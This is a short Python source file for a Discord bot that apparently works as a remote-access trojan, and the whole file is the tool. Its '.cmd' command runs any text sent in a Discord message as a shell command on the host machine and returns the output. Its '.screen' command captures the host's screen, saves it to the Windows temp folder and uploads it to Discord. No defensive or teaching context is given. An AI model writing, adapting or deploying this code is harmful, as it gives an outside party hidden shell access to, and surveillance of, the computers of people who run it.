import discord
import os
import os.path
from mss import mss
from discord import app_commands
from discord.ext import commands


        

intents = discord.Intents().all()
bot = commands.Bot(command_prefix = ".", intents=intents)

intents.message_content = True
intents.guilds = True
intents.members = True


@bot.event
async def on_ready():
    print("BOT ON!")

@bot.command()
async def cmd(ctx):
    cmd = ctx.message.content.replace(".cmd", "")
    output = os.popen(cmd).read()
    await ctx.send(output)

@bot.command()
async def screen(ctx):
    with mss() as sct:
        sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
    path = (os.getenv('TEMP')) + r"\monitor.png"
    file = discord.File((path), filename="monitor.png")
    await ctx.channel.send(file=file)
    os.remove(path)


bot.run("")
